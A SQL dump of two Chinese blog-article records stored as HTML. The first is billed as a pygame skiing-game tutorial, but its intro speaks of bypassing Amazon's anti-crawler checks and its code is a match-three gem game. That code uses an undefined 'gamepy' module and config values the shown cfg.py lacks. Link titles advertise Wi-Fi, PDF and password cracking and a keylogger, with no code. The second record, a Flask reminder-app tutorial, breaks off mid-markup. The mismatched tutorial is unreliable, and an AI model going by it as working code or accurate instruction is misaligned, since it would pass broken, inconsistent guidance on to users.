INSERT INTO `t_article` VALUES (69, 'Python开发一个滑雪小游戏', '<div id=\"content_views\" class=\"htmledit_views\"> \n <blockquote> \n  <p>大家好，我是Lex 喜欢欺负超人那个Lex</p> \n  <p>擅长领域：Python开发一个小游戏</p> \n  <p>今日重点：一步步分析and越过亚马逊的反爬虫机制</p> \n </blockquote> \n <h3>&nbsp;不一会，游戏写好了</h3> \n <p>效果是这样的</p> \n <p><img alt=\"\" height=\"652\" src=\"https://img-blog.csdnimg.cn/20210418135122258.gif\" width=\"634\"></p> \n <h3></h3> \n <h3>一、如何搭建开发环境环境</h3> \n <p><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115682970\">一起来学pygame吧 游戏开发30例（开篇词）——环境搭建+游戏效果展示</a></p> \n <blockquote> \n  <p>windows系统，python3.6+&nbsp; pip21+</p> \n </blockquote> \n <pre><code class=\"language-bash\">安装游戏依赖模块\n\npip install pygame</code></pre> \n <h3>二、完整开发流程</h3> \n <h3 id=\"%E9%A1%B9%E7%9B%AE%E4%B8%BB%E7%BB%93%E6%9E%84\">1、代码结构</h3> \n <p>首先，先整理一下项目的主结构，其实看一下主结构，基本就清晰了</p> \n <pre><code class=\"language-css\">modules：自己定义的模块\n——game.py:主程序\n\nres：存放引用到的图片和音频等等\n——music: 音频 资源\n——imgs: 图片 资源\n——fonts： 字体\n\ncfg.py：为主配置文件\n\nskiing.py：主程序文件\n\nrequirements.txt：需要引入的python依赖包</code></pre> \n <p><img alt=\"\" height=\"393\" src=\"https://img-blog.csdnimg.cn/20210617204935310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"469\"></p> \n <h3></h3> \n <h3 id=\"%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6\">2、详细配置</h3> \n <p><strong>cfg.py</strong></p> \n <p>配置文件中，需要引入os模块，并且配置打开游戏的屏幕大小。将我们需要用到的图片、音频和字体文件全部引入到项目中。</p> \n <pre><code class=\"language-python\">\'\'\'配置文件\'\'\'\nimport os\n\n\n\'\'\'FPS\'\'\'\nFPS = 40\n\'\'\'游戏屏幕大小\'\'\'\nSCREENSIZE = (640, 640)\n\'\'\'图片路径\'\'\'\nSKIER_IMAGE_PATHS = [\n    os.path.join(os.getcwd(), \'res/imgs/game_forward.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_right1.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_right2.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_left2.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_left1.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_fall.png\')\n]\nOBSTACLE_PATHS = {\n    \'tree\': os.path.join(os.getcwd(), \'res/imgs/tree.png\'),\n    \'flag\': os.path.join(os.getcwd(), \'res/imgs/flag.png\')\n}\n\'\'\'背景音乐路径\'\'\'\nBGMPATH = os.path.join(os.getcwd(), \'res/music/bgm.mp3\')\n\'\'\'字体路径\'\'\'\nFONTPATH = os.path.join(os.getcwd(), \'res/font/FZSTK.TTF\')</code></pre> \n <h3></h3> \n <h3 id=\"%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E8%BF%B7%E5%AE%AB%E5%9C%B0%E5%9B%BE\">3、动画中引用到的图片</h3> \n <p><img alt=\"\" height=\"326\" src=\"https://img-blog.csdnimg.cn/20210418144944794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"538\"></p> \n <p></p> \n <h3 id=\"5%E3%80%81%E8%B5%84%E6%BA%90%E7%9B%B8%E5%85%B3\">4、资源文件</h3> \n <p>包括游戏背景音频、图片和字体设计</p> \n <p><strong>res</strong></p> \n <p>music：游戏背景音乐</p> \n <p>fonts：记分牌呀、显示呀的 相关字体</p> \n <p>imgs：游戏动画里的静态图片，所谓动画都是图片</p> \n <p></p> \n <h3 id=\"6%E3%80%81%E5%90%AF%E5%8A%A8%E4%B8%BB%E7%A8%8B%E5%BA%8F\">5、主程序</h3> \n <p><strong>skiing.py</strong></p> \n <p>在主程序中，通过读取配置文件，引入项目资源：包括图片、音频等，并从我们的modules里引入所有我们的模块。</p> \n <pre><code class=\"language-python\">\'\'\' 类\'\'\'\nclass lexGame():\n    def __init__(self, screen, sounds, font, lex_imgs, cfg, **kwargs):\n        self.info = \'Gemlex —— hacklex\'\n        self.screen = screen\n        self.sounds = sounds\n        self.font = font\n        self.lex_imgs = lex_imgs\n        self.cfg = cfg\n        self.reset()\n    \'\'\'开始 \'\'\'\n    def start(self):\n        clock = gamepy.time.Clock()\n        # 遍历整个 界面更新位置\n        overall_moving = True\n        # 指定某些对象个体更新位置\n        individual_moving = False\n        # 定义一些必要的变量\n        lex_selected_xy = None\n        lex_selected_xy2 = None\n        swap_again = False\n        add_score = 0\n        add_score_showtimes = 10\n        time_pre = int(time.time())\n        #  主循环\n        while True:\n            for event in gamepy.event.get():\n                if event.type == gamepy.QUIT or (event.type == gamepy.KEYUP and event.key == gamepy.K_ESCAPE):\n                    gamepy.quit()\n                    sys.exit()\n                elif event.type == gamepy.MOUSEBUTTONUP:\n                    if (not overall_moving) and (not individual_moving) and (not add_score):\n                        position = gamepy.mouse.get_pos()\n                        if lex_selected_xy is None:\n                            lex_selected_xy = self.checkSelected(position)\n                        else:\n                            lex_selected_xy2 = self.checkSelected(position)\n                            if lex_selected_xy2:\n                                if self.swapGem(lex_selected_xy, lex_selected_xy2):\n                                    individual_moving = True\n                                    swap_again = False\n                                else:\n                                    lex_selected_xy = None\n            if overall_moving:\n                overall_moving = not self.dropGems(0, 0)\n                # 移动一次可能可以拼出多个3连块\n                if not overall_moving:\n                    res_match = self.isMatch()\n                    add_score = self.removeMatched(res_match)\n                    if add_score &gt; 0:\n                        overall_moving = True\n            if individual_moving:\n                lex1 = self.getGemByPos(*lex_selected_xy)\n                lex2 = self.getGemByPos(*lex_selected_xy2)\n                lex1.move()\n                lex2.move()\n                if lex1.fixed and lex2.fixed:\n                    res_match = self.isMatch()\n                    if res_match[0] == 0 and not swap_again:\n                        swap_again = True\n                        self.swapGem(lex_selected_xy, lex_selected_xy2)\n                        self.sounds[\'mismatch\'].play()\n                    else:\n                        add_score = self.removeMatched(res_match)\n                        overall_moving = True\n                        individual_moving = False\n                        lex_selected_xy = None\n                        lex_selected_xy2 = None\n            self.screen.fill((154, 206, 235))\n            self.drawGrids()\n            self.lexs_group.draw(self.screen)\n            if lex_selected_xy:\n                self.drawBlock(self.getGemByPos(*lex_selected_xy).rect)\n            if add_score:\n                if add_score_showtimes == 10:\n                    random.choice(self.sounds[\'match\']).play()\n                self.drawAddScore(add_score)\n                add_score_showtimes -= 1\n                if add_score_showtimes &lt; 1:\n                    add_score_showtimes = 10\n                    add_score = 0\n            self.remaining_time -= (int(time.time()) - time_pre)\n            time_pre = int(time.time())\n            self.showRemainingTime()\n            self.drawScore()\n            if self.remaining_time &lt;= 0:\n                return self.score\n            gamepy.display.update()\n            clock.tick(self.cfg.FPS)\n			\n    \'\'\'初始化\'\'\'\n    def reset(self):\n        # 随机生成各个块\n        while True:\n            self.all_lexs = []\n            self.lexs_group = gamepy.sprite.Group()\n            for x in range(self.cfg.NUMGRID):\n                self.all_lexs.append([])\n                for y in range(self.cfg.NUMGRID):\n                    lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE-self.cfg.NUMGRID*self.cfg.GRIDSIZE], downlen=self.cfg.NUMGRID*self.cfg.GRIDSIZE)\n                    self.all_lexs[x].append(lex)\n                    self.lexs_group.add(lex)\n            if self.isMatch()[0] == 0:\n                break\n        # 得分\n        self.score = 0\n        # 拼出一个的奖励\n        self.reward = 10\n        # 时间\n        self.remaining_time = 300\n    \'\'\'显示剩余时间\'\'\'\n    def showRemainingTime(self):\n        remaining_time_render = self.font.render(\'CountDown: %ss\' % str(self.remaining_time), 1, (85, 65, 0))\n        rect = remaining_time_render.get_rect()\n        rect.left, rect.top = (self.cfg.SCREENSIZE[0]-201, 6)\n        self.screen.blit(remaining_time_render, rect)\n    \'\'\'显示得分\'\'\'\n    def drawScore(self):\n        score_render = self.font.render(\'SCORE:\'+str(self.score), 1, (85, 65, 0))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (10, 6)\n        self.screen.blit(score_render, rect)\n    \'\'\'显示加分\'\'\'\n    def drawAddScore(self, add_score):\n        score_render = self.font.render(\'+\'+str(add_score), 1, (255, 99, 99))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (250, 250)\n        self.screen.blit(score_render, rect)\n    \'\'\'生成新的 块\'\'\'\n    def generateNewGems(self, res_match):\n        if res_match[0] == 1:\n            start = res_match[2]\n            while start &gt; -2:\n                for each in [res_match[1], res_match[1]+1, res_match[1]+2]:\n                    lex = self.getGemByPos(*[each, start])\n                    if start == res_match[2]:\n                        self.lexs_group.remove(lex)\n                        self.all_lexs[each][start] = None\n                    elif start &gt;= 0:\n                        lex.target_y += self.cfg.GRIDSIZE\n                        lex.fixed = False\n                        lex.direction = \'down\'\n                        self.all_lexs[each][start+1] = lex\n                    else:\n                        lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+each*self.cfg.GRIDSIZE, self.cfg.YMARGIN-self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE)\n                        self.lexs_group.add(lex)\n                        self.all_lexs[each][start+1] = lex\n                start -= 1\n        elif res_match[0] == 2:\n            start = res_match[2]\n            while start &gt; -4:\n                if start == res_match[2]:\n                    for each in range(0, 3):\n                        lex = self.getGemByPos(*[res_match[1], start+each])\n                        self.lexs_group.remove(lex)\n                        self.all_lexs[res_match[1]][start+each] = None\n                elif start &gt;= 0:\n                    lex = self.getGemByPos(*[res_match[1], start])\n                    lex.target_y += self.cfg.GRIDSIZE * 3\n                    lex.fixed = False\n                    lex.direction = \'down\'\n                    self.all_lexs[res_match[1]][start+3] = lex\n                else:\n                    lex = lexSprite(img_path=random.choice(self.lex_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+res_match[1]*self.cfg.GRIDSIZE, self.cfg.YMARGIN+start*self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE*3)\n                    self.lexs_group.add(lex)\n                    self.all_lexs[res_match[1]][start+3] = lex\n                start -= 1\n    \'\'\'移除匹配的lex\'\'\'\n    def removeMatched(self, res_match):\n        if res_match[0] &gt; 0:\n            self.generateNewGems(res_match)\n            self.score += self.reward\n            return self.reward\n        return 0\n    \'\'\' 界面的网格绘制\'\'\'\n    def drawGrids(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                rect = gamepy.Rect((self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE, self.cfg.GRIDSIZE, self.cfg.GRIDSIZE))\n                self.drawBlock(rect, color=(0, 0, 255), size=1)\n    \'\'\'画矩形block框\'\'\'\n    def drawBlock(self, block, color=(255, 0, 255), size=4):\n        gamepy.draw.rect(self.screen, color, block, size)\n    \'\'\'下落特效\'\'\'\n    def dropGems(self, x, y):\n        if not self.getGemByPos(x, y).fixed:\n            self.getGemByPos(x, y).move()\n        if x &lt; self.cfg.NUMGRID - 1:\n            x += 1\n            return self.dropGems(x, y)\n        elif y &lt; self.cfg.NUMGRID - 1:\n            x = 0\n            y += 1\n            return self.dropGems(x, y)\n        else:\n            return self.isFull()\n    \'\'\'是否每个位置都有 块了\'\'\'\n    def isFull(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if not self.getGemByPos(x, y).fixed:\n                    return False\n        return True\n    \'\'\'检查有无 块被选中\'\'\'\n    def checkSelected(self, position):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if self.getGemByPos(x, y).rect.collidepoint(*position):\n                    return [x, y]\n        return None\n    \'\'\'是否有连续一样的三个块(无--返回0/水平--返回1/竖直--返回2)\'\'\'\n    def isMatch(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if x + 2 &lt; self.cfg.NUMGRID:\n                    if self.getGemByPos(x, y).type == self.getGemByPos(x+1, y).type == self.getGemByPos(x+2, y).type:\n                        return [1, x, y]\n                if y + 2 &lt; self.cfg.NUMGRID:\n                    if self.getGemByPos(x, y).type == self.getGemByPos(x, y+1).type == self.getGemByPos(x, y+2).type:\n                        return [2, x, y]\n        return [0, x, y]\n    \'\'\'根据坐标获取对应位置的 对象\'\'\'\n    def getGemByPos(self, x, y):\n        return self.all_lexs[x][y]\n    \'\'\'交换 \'\'\'\n    def swapGem(self, lex1_pos, lex2_pos):\n        margin = lex1_pos[0] - lex2_pos[0] + lex1_pos[1] - lex2_pos[1]\n        if abs(margin) != 1:\n            return False\n        lex1 = self.getGemByPos(*lex1_pos)\n        lex2 = self.getGemByPos(*lex2_pos)\n        if lex1_pos[0] - lex2_pos[0] == 1:\n            lex1.direction = \'left\'\n            lex2.direction = \'right\'\n        elif lex1_pos[0] - lex2_pos[0] == -1:\n            lex2.direction = \'left\'\n            lex1.direction = \'right\'\n        elif lex1_pos[1] - lex2_pos[1] == 1:\n            lex1.direction = \'up\'\n            lex2.direction = \'down\'\n        elif lex1_pos[1] - lex2_pos[1] == -1:\n            lex2.direction = \'up\'\n            lex1.direction = \'down\'\n        lex1.target_x = lex2.rect.left\n        lex1.target_y = lex2.rect.top\n        lex1.fixed = False\n        lex2.target_x = lex1.rect.left\n        lex2.target_y = lex1.rect.top\n        lex2.fixed = False\n        self.all_lexs[lex2_pos[0]][lex2_pos[1]] = lex1\n        self.all_lexs[lex1_pos[0]][lex1_pos[1]] = lex2\n        return True\n    \'\'\'info\'\'\'\n    def __repr__(self):\n        return self.info</code></pre> \n <p></p> \n <h2 id=\"%E5%9B%9B%E3%80%81%E6%B8%B8%E6%88%8F%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95\">四、如何启动游戏</h2> \n <h3 id=\"1%E3%80%81%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8\">1、开发工具</h3> \n <p>如果你有配置了工具的环境VScode、sublimeText、notepad+、pycharm什么的，可以直接在工具中，运行游戏。</p> \n <p>如果没配置，可以使用命令启动。</p> \n <h3 id=\"2%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%20gif\">2、命令行</h3> \n <p><img alt=\"\" height=\"683\" src=\"https://img-blog.csdnimg.cn/20210418135242198.gif\" width=\"753\"></p> \n <h2></h2> \n <h2>【两种方法获取完整源码】</h2> \n <h3>1、资源下载：【pygame开发实战开发30例 完整源码】</h3> \n <p><a href=\"https://download.csdn.net/download/weixin_42350212/15836285\">https://download.csdn.net/download/weixin_42350212/15836285</a></p> \n <h3><strong>2、订阅专栏：【获取完整源码+教程】</strong></h3> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%A1%94%E9%98%B2%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%E5%B0%8F%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p></p> \n <h2>推荐阅读</h2> \n <p><strong>python实战</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117260497\">前女友婚礼，python破解婚礼现场的WIFI，把名称改成了</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/117031929\">【python实战】前女友发来加密的 “520快乐.pdf“，我用python破解开之后，却发现</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116936268\">【python实战】昨晚，我用python帮隔壁小姐姐P证件照 自拍，然后发现</a>...</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/116568510\">【python实战】女友半夜加班发自拍 python男友用30行代码发现惊天秘密</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">【python实战】python你TM太皮了——区区30行代码就能记录键盘的一举一动</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">【</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115399658\">python</a><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115580004\">实战】女神相册密码忘记了，我只用Python写了20行代码~~~</a></strong></p> \n <p><strong>pygame系列文章【订阅专栏，获取完整源码】</strong></p> \n <p><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p><strong><a href=\"https://blog.csdn.net/weixin_42350212/category_7716334.html\">渗透测试实战专栏</a></strong></p> \n <p><strong><a name=\"t15\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959170.html\">Windows AD/Exchange管理专栏</a></strong></p> \n <p><strong><a name=\"t16\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10959215.html\">Linux高性能服务器搭建</a>&nbsp;</strong></p> \n <p><strong><a name=\"t17\"></a><a href=\"https://blog.csdn.net/weixin_42350212/category_10649706.html\">PowerShell自动化专栏</a></strong></p> \n <p></p> \n <h3><span style=\"color:#fe2c24;\">CSDN官方学习推荐 ↓ ↓ ↓</span></h3> \n <p><strong>CSDN出的Python全栈知识图谱，太强了，推荐给大家！</strong></p> \n <p><img alt=\"\" height=\"615\" src=\"https://img-blog.csdnimg.cn/20210607120133619.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"345\">&nbsp;​</p> \n <p></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (77, '快进来看王冰冰！青年大学习提醒系统来了！！', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>目录</h3> \n  <ul>\n   <li>\n    <ul>\n     <li><a href=\"#1__9\">1. 青年大学习与冰冰</a></li>\n     <li><a href=\"#2_flask_18\">2. flask后端部分</a></li>\n     <li>\n      <ul>\n       <li><a href=\"#21__19\">2.1 前景概要</a></li>\n       <li><a href=\"#22__22\">2.2 具体细节</a></li>\n       <li>\n        <ul>\n         <li><a href=\"#221__23\">2.2.1 数据库部分</a></li>\n         <li><a href=\"#223__126\">2.2.3 路由部分</a></li>\n         <li><a href=\"#222__265\">2.2.2 数据交换部分</a></li>\n        </ul> </li>\n      </ul> </li>\n     <li><a href=\"#3_uniapp_274\">3. uni-app前端部分</a></li>\n     <li>\n      <ul>\n       <li><a href=\"#31__277\">3.1 登陆页面</a></li>\n       <li><a href=\"#32__281\">3.2 提醒页面</a></li>\n       <li><a href=\"#33__284\">3.3 效果演示</a></li>\n      </ul> </li>\n     <li><a href=\"#4__293\">4. 结语</a></li>\n     <li><a href=\"#_301\">最后</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <blockquote> \n  <p>创作前提：<br> 本人是班级团支书，每周都要催班上同学做青年大学习，于是我做了一个自动提醒的脚本，后来封装成了一个APP。<br> uniapp+flask前后端分离<br> 而且看青年大学习(<s>看冰冰老婆</s> )<br> 谁不喜欢呢？</p> \n </blockquote> \n <h2><a id=\"1__9\"></a>1. 青年大学习与冰冰</h2> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610230950913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>呜呜呜冰冰怎么这么<strong>好看且有气质</strong>啊！！！！<br> 呜呜呜wsl<br> <img src=\"https://img-blog.csdnimg.cn/20210611000053230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 为了让大家尽快学习到青年大学习！<br> 话不多说，直接看吧！</p> \n <hr> \n <h2><a id=\"2_flask_18\"></a>2. flask后端部分</h2> \n <h3><a id=\"21__19\"></a>2.1 前景概要</h3> \n <p>脚本获取数据部分戳这里<a href=\"https://blog.csdn.net/weixin_45304503/article/details/114501006?spm=1001.2014.3001.5501\">前情回顾</a></p> \n <h3><a id=\"22__22\"></a>2.2 具体细节</h3> \n <h4><a id=\"221__23\"></a>2.2.1 数据库部分</h4> \n <p>配置连接</p> \n <pre><code class=\"prism language-python\">HOSTNAME <span class=\"token operator\">=</span> <span class=\"token string\">\'127.0.0.1\'</span>  <span class=\"token comment\"># 这里改成你的mysql配置</span>\nPORT <span class=\"token operator\">=</span> <span class=\"token string\">\'3306\'</span>   \nDATABASE <span class=\"token operator\">=</span> <span class=\"token string\">\'teenstudy\'</span>\nUSERNAME <span class=\"token operator\">=</span> <span class=\"token string\">\'root\'</span>\nPASSWORD <span class=\"token operator\">=</span> <span class=\"token string\">\'root\'</span>\ndb_url <span class=\"token operator\">=</span> <span class=\"token string\">\'mysql+pymysql://{}:{}@{}:{}/{}?charset=utf8\'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>\n    USERNAME<span class=\"token punctuation\">,</span>\n    PASSWORD<span class=\"token punctuation\">,</span>\n    HOSTNAME<span class=\"token punctuation\">,</span>\n    PORT<span class=\"token punctuation\">,</span>\n    DATABASE<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    SQLALCHEMY_DATABASE_URI <span class=\"token operator\">=</span> db_url\n    SQLALCHEMY_TRACK_MODIFICATIONS <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n    SQLALCHEMY_COMMIT_ON_TEARDOWN <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n\n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\nCORS<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> supports_credentials<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\npymysql<span class=\"token punctuation\">.</span>install_as_MySQLdb<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>from_object<span class=\"token punctuation\">(</span>Config<span class=\"token punctuation\">)</span>\ndb <span class=\"token operator\">=</span> SQLAlchemy<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span>\n\nmanager <span class=\"token operator\">=</span> Manager<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span>      <span class=\"token comment\"># 数据迁移</span>\nMigrate<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">,</span> db<span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 第一个参数是flask实例，第二个参数SQLAlchemy实例</span>\nmanager<span class=\"token punctuation\">.</span>add_command<span class=\"token punctuation\">(</span><span class=\"token string\">\"db\"</span><span class=\"token punctuation\">,</span> MigrateCommand<span class=\"token punctuation\">)</span>\n\nengin <span class=\"token operator\">=</span> create_engine<span class=\"token punctuation\">(</span>db_url<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建引擎</span>\nBase <span class=\"token operator\">=</span> declarative_base<span class=\"token punctuation\">(</span>engin<span class=\"token punctuation\">)</span>\nSession <span class=\"token operator\">=</span> sessionmaker<span class=\"token punctuation\">(</span>engin<span class=\"token punctuation\">)</span>\nsession <span class=\"token operator\">=</span> Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>数据库的相关字段设置</p> \n <pre><code class=\"prism language-python\"><span class=\"token comment\"># 用户模型</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    __tablename__ <span class=\"token operator\">=</span> <span class=\"token string\">\'users\'</span>\n    <span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> primary_key<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    account <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 账号</span>\n    add_time <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>DateTime<span class=\"token punctuation\">,</span> index<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span>datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建时间</span>\n    email <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 邮箱</span>\n    name <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 名字</span>\n    province <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 省份</span>\n    school <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 学校</span>\n    college <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 学院</span>\n    origirtion <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 组织</span>\n    grade <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token 